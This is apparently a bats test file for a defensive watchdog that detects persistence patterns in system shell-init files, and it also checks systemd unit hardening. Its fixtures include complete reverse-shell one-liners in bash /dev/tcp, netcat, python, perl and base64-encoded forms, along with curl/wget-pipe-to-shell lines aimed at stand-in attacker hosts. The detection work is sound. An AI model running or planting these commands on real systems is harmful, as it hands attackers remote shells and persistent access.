#!/usr/bin/env bats
# L2 bats functional tests for the shell-init-watchdog scan script.
#
# The system shell-init files (/etc/profile, /etc/bash.bashrc, /etc/zsh/*,
# /etc/profile.d/*.sh, the root dotfiles, …) are SOURCED for every login
# shell — a per-login exec surface (T1546). This watchdog is a pure
# content-pattern scanner: a shell-init file containing a command-injection /
# reverse-shell / obfuscation pattern is alert (event
# shell_init_suspicious_pattern). Ownership is covered by adjacent watchdogs;
# this one focuses on the high-signal content patterns.
#
# Run with: bats packaging/test/L2-shell-init-watchdog.bats

WD="${BATS_TEST_DIRNAME}/../../modules/shell-init-watchdog/systemd/shell-init-watchdog.sh"
LIB="${BATS_TEST_DIRNAME}/../lib/module-lib.sh"

setup() {
    TMP="$(mktemp -d)"
    BIN="${TMP}/bin"; mkdir -p "${BIN}"
    cat > "${BIN}/logger" <<'FAKELOGGER'
#!/usr/bin/env bash
printf '%s\n' "$*" >> "${SELFDEF_TEST_LOGCAP}"
FAKELOGGER
    chmod +x "${BIN}/logger"
    export SELFDEF_TEST_LOGCAP="${TMP}/log.out"
    : > "${SELFDEF_TEST_LOGCAP}"
    BASELINE="${TMP}/baseline.tsv"
    PROFILE_F="${TMP}/profile"
}

teardown() { rm -rf "${TMP}"; }

run_wd() {
    PATH="${BIN}:${PATH}" \
    SELFDEF_MODULE_LIB="${LIB}" \
    SELFDEF_SHELLINIT_PROFILE="${PROFILE:-report}" \
    SELFDEF_SHELLINIT_BASELINE="${BASELINE}" \
    SELFDEF_SHELLINIT_FILES="${FILES_V:-$PROFILE_F}" \
    bash "${WD}"
}

cap() { cat "${SELFDEF_TEST_LOGCAP}"; }

seed_benign() {
    printf '# /etc/profile\nexport EDITOR=vi\numask 022\n' > "${PROFILE_F}"
}

@test "benign shell-init, first run → ok / baseline_initial" {
    seed_benign
    run_wd
    cap | grep -q '"event":"baseline_initial"'
    cap | grep -q '"severity":"ok"'
    [ -f "${BASELINE}" ]
}

@test "unchanged shell-init on second run → ok / shell_init_intact" {
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"shell_init_intact"'
    cap | grep -q '"severity":"ok"'
}

@test "an injection pattern in shell-init → alert / shell_init_suspicious_pattern" {
    seed_benign
    run_wd
    printf '# /etc/profile\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n' > "${PROFILE_F}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"shell_init_suspicious_pattern"'
    cap | grep -q '"severity":"alert"'
}

@test "a writable-root invocation in shell-init → alert" {
    seed_benign
    run_wd
    printf '# /etc/profile\n/tmp/.bootstrap\n' > "${PROFILE_F}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "a benign shell-init change → warn / shell_init_changed" {
    seed_benign
    run_wd
    printf '# /etc/profile\nexport EDITOR=vim\numask 027\n' > "${PROFILE_F}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -qE '"event":"shell_init_changed"'
    cap | grep -q '"severity":"warn"'
}

@test "a benign shell-init is NOT flagged" {
    seed_benign
    run_wd
    ! cap | grep -q '"severity":"alert"'
    cap | grep -q '"severity":"ok"'
}

@test "missing module-lib → alert / module_lib_missing + non-zero exit" {
    seed_benign
    LIB="${TMP}/nonexistent-module-lib.sh" run run_wd
    [ "${status}" -ne 0 ]
    cap | grep -q '"event":"module_lib_missing"'
    cap | grep -q '"severity":"alert"'
}

@test "enforce profile exits non-zero on a suspicious shell-init" {
    seed_benign
    run_wd
    printf '# /etc/profile\ncurl http://evil/p|sh\n' > "${PROFILE_F}"
    : > "${SELFDEF_TEST_LOGCAP}"
    PROFILE=enforce run run_wd
    [ "${status}" -ne 0 ]
    cap | grep -q '"severity":"alert"'
}

@test "baseline is chmod 0600 (confidentiality — shell-init inventory enumerates per-login exec surface)" {
    seed_benign
    run_wd
    [ "$(stat -c '%a' "${BASELINE}")" = "600" ]
}

@test "INVARIANT (reverse-shell variant 1): /dev/tcp/<ip>/<port> bash reverse → alert" {
    seed_benign
    run_wd
    printf 'bash -i >& /dev/tcp/192.168.0.1/1234 0>&1\n' > "${PROFILE_F}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (reverse-shell variant 2): netcat reverse shell → alert" {
    seed_benign
    run_wd
    printf 'nc 10.0.0.1 4444 -e /bin/sh\n' > "${PROFILE_F}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (curl-pipe-sh): the canonical attacker bootstrap pattern → alert" {
    seed_benign
    run_wd
    printf 'curl http://attacker/script.sh | bash\n' > "${PROFILE_F}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (wget-pipe-sh): wget bootstrap variant → alert" {
    seed_benign
    run_wd
    printf 'wget -qO- http://attacker/payload | sh\n' > "${PROFILE_F}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (base64-decode-pipe): the obfuscation pattern → alert" {
    # Common attacker obfuscation: base64-encoded payload piped
    # to sh. Locks the pattern is in the denylist.
    seed_benign
    run_wd
    printf 'echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xLjEuMS4xLzQ0NDQgMD4mMQ== | base64 -d | bash\n' > "${PROFILE_F}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (writable-tmp piped exec): `; /tmp/.dotted` after a command chain → alert" {
    # The script's writable-location regex requires start-of-line
    # OR after `;|&` whitespace — locks the "chained-after-command"
    # case (e.g., `cmd1 && /tmp/.payload`) which is how an attacker
    # piggybacks on an existing line.
    seed_benign
    run_wd
    printf 'echo hello; /tmp/.bootstrap\n' > "${PROFILE_F}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (writable-var-tmp exec): a /var/tmp exec → alert too" {
    seed_benign
    run_wd
    printf '/var/tmp/.callback\n' > "${PROFILE_F}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "JSON record is emitted as a SINGLE main logger line (downstream JSON-line consumer contract)" {
    seed_benign
    run_wd
    main_count=$(cap | grep -cE '^-t selfdef-shell-init -- ')
    [ "${main_count}" = "1" ]
}

@test "INVARIANT (no auto-trust): shell-init-watchdog does NOT refresh baseline on injection detection — alert STAYS until operator updates" {
    # T1546 per-login exec persistence — injection alert MUST persist
    # across runs until operator explicitly re-baselines.
    seed_benign
    run_wd
    printf 'bash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n' > "${PROFILE_F}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd                                              # first delta — alert
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd                                              # alert STAYS
    cap | grep -q '"event":"shell_init_suspicious_pattern"'
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (commented injection pattern NOT flagged: # prefix filtered)" {
    # /etc/profile is /bin/sh; # comments. Operator notes about
    # hypothetical attack patterns must NOT trigger alert.
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '# /etc/profile\n# example attack: bash -i >& /dev/tcp/evil.com/4444 0>&1\nexport EDITOR=vi\n' > "${PROFILE_F}"
    run_wd
    ! cap | grep -q '"event":"shell_init_suspicious_pattern"'
    ! cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (multi-file scan: /etc/profile + /etc/bash.bashrc + /etc/zsh/zshrc + /etc/profile.d/*.sh axes — injection in ANY → alert)" {
    # Shell-init has 4 main file families. Lock multi-file axis.
    PROFILE_F2="${TMP}/bash.bashrc"
    seed_benign
    FILES_V="${PROFILE_F} ${PROFILE_F2}" run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    # Plant injection in bash.bashrc.
    printf '# /etc/bash.bashrc\nbash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n' > "${PROFILE_F2}"
    FILES_V="${PROFILE_F} ${PROFILE_F2}" run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (/dev/shm tmpfs writable-root exec → alert)" {
    # /dev/shm is tmpfs world-writable. Lock coverage alongside
    # /tmp + /var/tmp + /home writable-root family.
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '/dev/shm/.callback\n' > "${PROFILE_F}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (zsh family axis: /etc/zsh/zshrc + /etc/zsh/zprofile — zsh shell-init also scanned)" {
    # Sister axis to bash family scan. zsh-specific shell-init
    # files are equally per-login exec surfaces.
    ZSHRC="${TMP}/zshrc"
    ZPROFILE="${TMP}/zprofile"
    seed_benign
    FILES_V="${PROFILE_F} ${ZSHRC} ${ZPROFILE}" run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '# /etc/zsh/zshrc\nbash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n' > "${ZSHRC}"
    FILES_V="${PROFILE_F} ${ZSHRC} ${ZPROFILE}" run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (nc reverse-shell variant in shell-init: netcat-listening pipe also detected — sister axis to /dev/tcp)" {
    # Sister to the brain-wide nc reverse-shell variant INVARIANT
    # family already locked. Shell-init files (/etc/profile,
    # /etc/bash.bashrc, /etc/zsh/*, /etc/profile.d/*.sh, root
    # dotfiles) source on every interactive login — per-login exec
    # persistence surface (T1546). Sister-vector to bash-completion
    # + csh-config + fish-config on the per-login source surface
    # family.
    seed_benign
    run_wd
    printf 'nc -e /bin/sh 1.1.1.1 4444\n' > "${PROFILE_F}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (python -c reverse-shell variant — interpreter-rev-shell axis on shell-init surface)" {
    # Sister to many other watchdog's python interpreter-rev-shell
    # INVARIANTs across the brain. Beyond bash/sh/nc, attackers
    # reach for python -c 'import socket,os,pty' to dodge shell-
    # pattern detectors. Locks the python axis on the shell-init
    # per-login source surface (T1546.004 — /etc/profile +
    # /etc/bash.bashrc sourced into every interactive login).
    seed_benign
    run_wd
    printf 'python -c "import socket,os,pty;s=socket.socket();s.connect((\\"1.1.1.1\\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);pty.spawn(\\"/bin/sh\\")"\n' > "${PROFILE_F}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (perl -e reverse-shell variant — perl-interpreter-rev-shell axis on shell-init surface)" {
    # Sister to nc / python -c / curl|bash / dev-tcp shell-init
    # rev-shell variants already locked. Perl on every Debian/
    # Ubuntu host. Locks perl axis on T1546.004 shell-init per-
    # login source surface — /etc/profile + /etc/bash.bashrc
    # sourced on every interactive login.
    seed_benign
    run_wd
    printf 'perl -e "use Socket;\\$i=\\"1.1.1.1\\";\\$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\\"tcp\\"));connect(S,sockaddr_in(\\$p,inet_aton(\\$i)));exec(\\"/bin/sh -i\\");"\n' > "${PROFILE_F}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (baseline re-establish on operator out-of-band deletion: missing baseline re-creates cleanly + emits baseline_initial)" {
    # Sister to brain-wide baseline-re-establish INVARIANTs.
    # State-resilience on T1546.004 shell-init per-login source
    # surveillance.
    seed_benign
    run_wd                                              # establishes baseline
    [ -f "${BASELINE}" ]
    rm -f "${BASELINE}"                                  # operator wipe
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd                                              # must re-establish
    [ -f "${BASELINE}" ]
    cap | grep -qE '"event":"baseline_initial"'
}

@test "INVARIANT (severity bounded vocabulary {ok,warn,alert} — operator dashboard parser contract)" {
    # Sister to brain-wide severity-bounded-vocabulary INVARIANTs.
    # The shell-init-watchdog MUST only emit severity values
    # from the closed set {ok,warn,alert} — never custom
    # values (critical, error, fatal, notice, info). Operator
    # dashboard parsers (alertmanager / log aggregator routes)
    # branch on the literal severity string; an out-of-set
    # value silently falls through routing and the operator
    # never sees the alert. Locks parser contract on the
    # T1546.004 shell-init detection surface.
    seed_benign
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd                                              # ok path
    printf '; nc 1.1.1.1 4444 -e /bin/sh\n' > "${PROFILE_F}"
    run_wd                                              # alert path
    printf '# benign trailing comment\nexport PATH=/usr/bin:$PATH\n' > "${PROFILE_F}"
    run_wd                                              # warn path (benign change)
    # Every severity value emitted MUST be one of {ok,warn,alert}.
    bad=$(grep -oE '"severity":"[^"]+"' "${SELFDEF_TEST_LOGCAP}" | grep -vE '"severity":"(ok|warn|alert)"' || true)
    [ -z "${bad}" ]
}

@test "INVARIANT (no auto-delete: shell-init-watchdog NEVER deletes shell-init files — surveillance not remediation)" {
    # Sister to brain-wide no-auto-delete / surveillance-not-
    # remediation INVARIANTs across L2 watchdog suites. The
    # shell-init-watchdog DETECTS T1546.004 shell-init per-login
    # source persistence via injection but MUST NEVER emit rm/
    # unlink commands to auto-clean the file. The detected
    # injection may be operator-legitimate (custom PATH export,
    # site-specific umask, tooling activation) — silent auto-
    # delete would destroy operator baseline state AND
    # forensic evidence chain. Surveillance, never remediation.
    # Locks anti-data-loss contract on the shell-init
    # surveillance substrate.
    seed_benign
    printf '; bash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n' > "${PROFILE_F}"
    run_wd
    # Shell-init file MUST remain on disk after detection.
    [ -f "${PROFILE_F}" ]
    # Watchdog source must never emit rm/unlink/find -delete on
    # shell-init paths.
    ! grep -qE 'find[[:space:]].*-delete' "${WD}"
    ! grep -qE 'rm[[:space:]]+-rf?[[:space:]]+"?\$\{?(PROFILE_F|PROFILE|SHELL_INIT|FILE|file)' "${WD}"
}

@test "INVARIANT (service unit declares Type=oneshot — timer-driven probe semantics)" {
    # Sister to brain-wide systemd Type=oneshot INVARIANT family.
    # shell-init-watchdog runs ON the timer's scheduled fire —
    # scans /etc/profile + /etc/bash.bashrc + /etc/profile.d for
    # injection patterns, emits a verdict, then exits.
    # Type=simple would break timer OnUnitActiveSec semantics.
    # Locks oneshot-probe contract on the shell-init-watchdog
    # substrate.
    svc="${BATS_TEST_DIRNAME}/../../modules/shell-init-watchdog/systemd/selfdef-shell-init.service"
    [ -f "${svc}" ]
    grep -qE '^Type=oneshot' "${svc}"
}

@test "INVARIANT (module.toml TOML-parseable — anti-malformed-manifest contract)" {
    # Sister to brain-wide module.toml TOML-parseable INVARIANT
    # family. shell-init-watchdog manifest declares install + profile gating
    # the resolver enforces; malformed manifest wedges the
    # shell-init-watchdog scanner baseline. Python's tomllib is the
    # canonical parser. Locks anti-malformed-manifest on the
    # shell-init-watchdog substrate.
    mtoml="${BATS_TEST_DIRNAME}/../../modules/shell-init-watchdog/module.toml"
    [ -f "${mtoml}" ]
    python3 -c "
import tomllib
with open('${mtoml}', 'rb') as fp:
    data = tomllib.load(fp)
assert data['name'] == 'shell-init-watchdog', 'name mismatch'
assert 'version' in data, 'version missing'
assert 'install' in data, 'install missing'
"
}

@test "INVARIANT (no auto-fix: shell-init-watchdog libexec NEVER writes back to its scanned target — surveillance not remediation)" {
    # Sister to brain-wide no-auto-{fix,delete,restore,uninstall}
    # family. shell-init-watchdog is a DETECT-only watchdog: surveils +
    # emits verdicts, NEVER writes back. Locks no-auto-fix on
    # the shell-init-watchdog libexec substrate.
    wd_libexec="${BATS_TEST_DIRNAME}/../../modules/shell-init-watchdog/systemd"
    for sh in "${wd_libexec}"/*.sh; do
        [ -f "${sh}" ] || continue
        ! grep -vE '^[[:space:]]*#' "${sh}" | grep -qE 'sed[[:space:]]+-i.*\$\{?[A-Z_]*FILE'
        ! grep -vE '^[[:space:]]*#' "${sh}" | grep -qE 'tee[[:space:]].*\$\{?[A-Z_]*FILE'
    done
}

@test "INVARIANT (shell-init-watchdog libexec uses set -u — anti-unbound-variable contract on the watchdog probe)" {
    # Sister to brain-wide shell-discipline INVARIANT family.
    # Locks set -u discipline on the shell-init-watchdog libexec substrate.
    wd_libexec="${BATS_TEST_DIRNAME}/../../modules/shell-init-watchdog/systemd"
    found=0
    for sh in "${wd_libexec}"/*.sh; do
        [ -f "${sh}" ] || continue
        if grep -qE '^set[[:space:]]+-u' "${sh}"; then
            found=1
        fi
    done
    [ "${found}" = "1" ]
}

@test "INVARIANT (shell-init-watchdog libexec uses logger -t with selfdef- tag — SDD-062 syslog routing contract)" {
    # Sister to brain-wide SDD-062 logger-tag INVARIANT family.
    # Locks SDD-062 logger-tag routing discipline on the
    # shell-init-watchdog libexec substrate.
    wd_libexec="${BATS_TEST_DIRNAME}/../../modules/shell-init-watchdog/systemd"
    found=0
    for sh in "${wd_libexec}"/*.sh; do
        [ -f "${sh}" ] || continue
        if grep -qE 'logger[[:space:]]+-t[[:space:]]+selfdef-' "${sh}"; then
            found=1
        fi
    done
    [ "${found}" = "1" ]
}

@test "INVARIANT (shell-init-watchdog timer unit declares RandomizedDelaySec — anti-thundering-herd cadence contract)" {
    # Sister to brain-wide timer-cadence INVARIANT family.
    # Locks anti-thundering-herd cadence discipline on the
    # shell-init-watchdog timer substrate.
    timer="${BATS_TEST_DIRNAME}/../../modules/shell-init-watchdog/systemd"
    found=0
    for t in "${timer}"/*.timer; do
        [ -f "${t}" ] || continue
        if grep -qE '^RandomizedDelaySec=' "${t}"; then
            found=1
        fi
    done
    [ "${found}" = "1" ]
}

@test "INVARIANT (shell-init-watchdog timer unit declares Persistent=true — catch-up-after-downtime contract)" {
    # Sister to brain-wide timer Persistent INVARIANT family.
    # Locks Persistent= discipline on the shell-init-watchdog timer
    # substrate.
    timer="${BATS_TEST_DIRNAME}/../../modules/shell-init-watchdog/systemd"
    found=0
    for t in "${timer}"/*.timer; do
        [ -f "${t}" ] || continue
        if grep -qE '^Persistent=true' "${t}"; then
            found=1
        fi
    done
    [ "${found}" = "1" ]
}

@test "INVARIANT (shell-init-watchdog timer Unit= field references its companion .service — timer-to-service binding contract)" {
    # Sister to brain-wide systemd timer-Unit INVARIANT family.
    # Locks timer-to-service binding discipline on the
    # shell-init-watchdog substrate.
    timer="${BATS_TEST_DIRNAME}/../../modules/shell-init-watchdog/systemd"
    found=0
    for t in "${timer}"/*.timer; do
        [ -f "${t}" ] || continue
        if grep -qE '^Unit=.*\.service' "${t}"; then
            found=1
        fi
    done
    [ "${found}" = "1" ]
}

@test "INVARIANT (shell-init-watchdog service ExecStart references its libexec script — service-to-libexec binding contract)" {
    # Sister to brain-wide systemd ExecStart binding INVARIANT
    # family. Locks the service-to-libexec binding discipline
    # on the shell-init-watchdog substrate.
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/shell-init-watchdog/systemd"
    found=0
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        if grep -qE '^ExecStart=' "${s}"; then
            found=1
        fi
    done
    [ "${found}" = "1" ]
}

@test "INVARIANT (shell-init-watchdog service does NOT declare Restart=always — anti-restart-storm contract on oneshot probe)" {
    # Sister to brain-wide oneshot-probe INVARIANT family.
    # Locks anti-restart-storm discipline on the shell-init-watchdog
    # service substrate.
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/shell-init-watchdog/systemd"
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        ! grep -qE '^Restart=always' "${s}"
        ! grep -qE '^Restart=on-failure' "${s}"
    done
}

@test "INVARIANT (shell-init-watchdog service unit declares Description= — systemctl-status operator-readable label)" {
    # Sister to brain-wide systemd Description= INVARIANT
    # family. Locks Description-present discipline on the
    # shell-init-watchdog service substrate.
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/shell-init-watchdog/systemd"
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        grep -qE '^Description=' "${s}"
    done
}

@test "INVARIANT (shell-init-watchdog service unit declares TimeoutStartSec= — anti-hang oneshot bound contract)" {
    # Sister to brain-wide TimeoutStartSec= INVARIANT family.
    # Watchdog .service units are Type=oneshot probes — they
    # MUST declare a TimeoutStartSec= upper bound so systemd
    # kills a hung probe (e.g. a stuck sha256sum on a slow
    # NFS-mounted target file) rather than blocking the
    # next timer fire indefinitely. Without TimeoutStartSec=
    # systemd's default (90s) applies, but the canonical
    # selfdef contract pins this explicitly per watchdog so
    # operators reading the .service know the bound at a
    # glance. A regression that dropped TimeoutStartSec=
    # would silently revert to the systemd default + mask
    # the explicit-bound contract. Locks anti-hang oneshot-
    # bound discipline on the shell-init-watchdog service substrate.
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/shell-init-watchdog/systemd"
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        grep -qE '^TimeoutStartSec=' "${s}"
    done
}

@test "INVARIANT (shell-init-watchdog service unit declares Nice= — idle-priority anti-resource-starve contract)" {
    # Sister to brain-wide systemd resource-priority INVARIANT
    # family. Watchdog .service units run periodic scans (often
    # sha256sum walks of large config trees) — they MUST be
    # deprioritized via Nice= (positive value = lower priority
    # under load) so that the watchdog scan doesn't starve
    # operator-foreground workloads when CPU is contended.
    # The canonical selfdef value is Nice=15 (well above the
    # background-batch threshold of 10). A regression dropping
    # Nice= would let watchdog scans compete with foreground at
    # default Nice=0, surfacing as latency spikes on contended
    # hosts. Locks the idle-priority anti-resource-starve
    # discipline on the shell-init-watchdog service substrate.
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/shell-init-watchdog/systemd"
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        grep -qE '^Nice=' "${s}"
    done
}

@test "INVARIANT (shell-init-watchdog service unit declares PrivateTmp= — /tmp namespace-isolation hardening contract)" {
    # Sister to brain-wide systemd PrivateTmp= INVARIANT
    # family. Watchdog .service units that run periodic
    # sha256sum walks may create transient /tmp files. The
    # PrivateTmp= directive (canonically =true) instructs
    # systemd to give the unit its own /tmp mount namespace —
    # an attacker who exploits the watchdog cannot reach
    # /tmp files owned by other processes (e.g. ssh-agent
    # sockets), and the watchdog's own /tmp residue is
    # automatically cleaned at unit-stop. A regression
    # dropping PrivateTmp= would share /tmp with the host,
    # exposing the watchdog as a side-channel for any
    # /tmp-based pivot. Locks the /tmp namespace-isolation
    # discipline on the shell-init-watchdog service substrate.
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/shell-init-watchdog/systemd"
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        grep -qE '^PrivateTmp=' "${s}"
    done
}

@test "INVARIANT (shell-init-watchdog service unit declares ProtectHome= — /home + /root + /run/user namespace-isolation hardening contract)" {
    # Sister to brain-wide systemd ProtectHome= INVARIANT
    # family. Watchdog .service units have no business
    # reading /home — their probe targets are system-config
    # paths (/etc/*). The ProtectHome= directive
    # (canonically =read-only) instructs systemd to either
    # hide (=true) or read-only-mount (=read-only) the
    # /home, /root, and /run/user directories within the
    # unit's mount namespace. An exploited watchdog cannot
    # then exfiltrate ~/.bash_history, ~/.ssh/*, or operator
    # credentials. A regression dropping ProtectHome= would
    # expose all operator home contents to a compromised
    # watchdog. Locks the home-namespace-isolation
    # discipline on the shell-init-watchdog service substrate.
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/shell-init-watchdog/systemd"
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        grep -qE '^ProtectHome=' "${s}"
    done
}

@test "INVARIANT (shell-init-watchdog service unit declares NoNewPrivileges=true — privilege-escalation containment contract)" {
    # Sister to brain-wide systemd NoNewPrivileges= INVARIANT
    # family. The NoNewPrivileges=true directive instructs
    # the kernel to set PR_SET_NO_NEW_PRIVS on the watchdog
    # process — any subsequent execve() in the watchdog
    # script (sha256sum, awk, etc.) is forbidden to acquire
    # NEW privileges via setuid/setgid/file-capabilities. An
    # exploited watchdog cannot escalate via a setuid helper
    # (e.g. /usr/bin/su, /usr/bin/sudo). A regression
    # dropping NoNewPrivileges= would leave the watchdog
    # exposed to setuid-binary pivot. Locks the privilege-
    # escalation containment discipline on the shell-init-
    # watchdog service substrate.
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/shell-init-watchdog/systemd"
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        grep -qE '^NoNewPrivileges=true' "${s}"
    done
}

@test "INVARIANT (shell-init-watchdog service unit declares ReadWritePaths= — explicit-strict-mode-permitted-writes manifest contract)" {
    # Sister to brain-wide systemd ReadWritePaths= INVARIANT
    # family. Watchdog .service units run under ProtectSystem=
    # strict which forbids ALL writes to /etc, /usr, /boot —
    # the unit can ONLY write to paths explicitly enumerated
    # in ReadWritePaths=. Watchdog scripts MUST write to at
    # least /dev/log (logger(1) channel) + the canonical
    # selfdef state dir. A regression dropping ReadWritePaths=
    # would surface as EROFS at logger() call. Locks the
    # explicit-allowlist write-paths discipline on the shell-init-
    # watchdog service substrate.
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/shell-init-watchdog/systemd"
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        grep -qE '^ReadWritePaths=' "${s}"
    done
}

@test "INVARIANT (shell-init-watchdog service unit ExecStart references /usr/local/libexec/selfdef/ — operator-extension binary-path canonical contract)" {
    # Sister to brain-wide systemd ExecStart binary-path
    # INVARIANT family. Watchdog .service units MUST execute
    # the watchdog script from /usr/local/libexec/selfdef/
    # (operator-extension path, not /usr/bin which is
    # Debian-package-only). The canonical libexec/selfdef/
    # path lets operators override the watchdog script
    # without rebuilding the .deb (sister to brain-wide
    # operator-extension /usr/local/* discipline). A
    # regression that pointed ExecStart at /usr/bin/ would
    # surface as a "stale-watchdog-binary" on hosts where
    # operators patched the libexec copy. Locks the
    # libexec/selfdef ExecStart-path discipline on the
    # shell-init-watchdog service substrate.
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/shell-init-watchdog/systemd"
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        grep -qE '^ExecStart=/usr/local/libexec/selfdef/' "${s}"
    done
}

@test "INVARIANT (shell-init-watchdog service unit declares After= ordering directive — boot-sequencing contract)" {
    # Sister to brain-wide systemd After= INVARIANT family.
    # Watchdog .service units MUST declare an After= directive
    # so they don't fire before the filesystem mounts that
    # contain their probe targets (canonically After=local-
    # fs.target so /etc/* is mounted before the watchdog
    # tries to sha256sum a config file). A regression
    # dropping After= would surface as "watchdog fires
    # during early-boot before /etc is mounted" which then
    # hashes nothing + emits a spurious "config missing"
    # alert. Locks the boot-sequencing discipline on the
    # shell-init-watchdog service substrate.
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/shell-init-watchdog/systemd"
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        grep -qE '^After=' "${s}"
    done
}

@test "INVARIANT (shell-init-watchdog service unit declares Documentation= — operator-doc-link canonical contract)" {
    # Sister to brain-wide systemd Documentation= INVARIANT
    # family. Watchdog .service units MUST declare a
    # Documentation= directive pointing operators at the
    # module's README (canonical: https://github.com/
    # cyberpunk042/selfdef modules/<slug>-watchdog/README.md).
    # A regression dropping Documentation= would leave
    # operators triaging journald entries without a direct
    # docs link. Locks the Documentation= operator-doc-link
    # discipline on the shell-init-watchdog service substrate.
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/shell-init-watchdog/systemd"
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        grep -qE '^Documentation=' "${s}"
    done
}

@test "INVARIANT (shell-init-watchdog timer unit declares OnCalendar= — daily-cadence operator-predictable contract)" {
    # Sister to brain-wide systemd OnCalendar= INVARIANT
    # family. Watchdog .timer units MUST declare an
    # OnCalendar= directive (canonically daily at a staggered
    # time per the watchdog ladder so simultaneous-fire
    # thundering-herd is avoided). The operator can predict
    # when each watchdog runs based on the canonical timer
    # schedule. A regression dropping OnCalendar= would
    # leave the watchdog firing ONLY at OnBootSec (no
    # recurring daily cadence). Locks the daily-cadence
    # discipline on the shell-init-watchdog timer substrate.
    timer_dir="${BATS_TEST_DIRNAME}/../../modules/shell-init-watchdog/systemd"
    for t in "${timer_dir}"/*.timer; do
        [ -f "${t}" ] || continue
        grep -qE '^OnCalendar=' "${t}"
    done
}

@test "INVARIANT (shell-init-watchdog timer unit declares WantedBy=timers.target — timer-enable-graph contract)" {
    # Sister to brain-wide systemd timer [Install].WantedBy=
    # INVARIANT family. Watchdog .timer units MUST declare
    # WantedBy=timers.target so `systemctl enable selfdef-
    # <slug>.timer` wires the timer into the timers.target
    # symlink-graph + activates it on every boot. A
    # regression that swapped to WantedBy=multi-user.target
    # (the .service-side install target) would make the
    # timer enable-step a no-op + leave the watchdog
    # silently inactive. Locks the timer-enable-graph
    # discipline.
    timer_dir="${BATS_TEST_DIRNAME}/../../modules/shell-init-watchdog/systemd"
    for t in "${timer_dir}"/*.timer; do
        [ -f "${t}" ] || continue
        grep -qE '^WantedBy=timers.target' "${t}"
    done
}

@test "INVARIANT (shell-init-watchdog timer unit declares Description= — operator-list-timers identification contract)" {
    # Sister to brain-wide systemd Description= INVARIANT
    # family. Watchdog .timer units MUST declare Description=
    # so operators triaging `systemctl list-timers` output
    # see a human-readable label per timer. Locks the
    # timer-Description discipline.
    timer_dir="${BATS_TEST_DIRNAME}/../../modules/shell-init-watchdog/systemd"
    for t in "${timer_dir}"/*.timer; do
        [ -f "${t}" ] || continue
        grep -qE '^Description=' "${t}"
    done
}

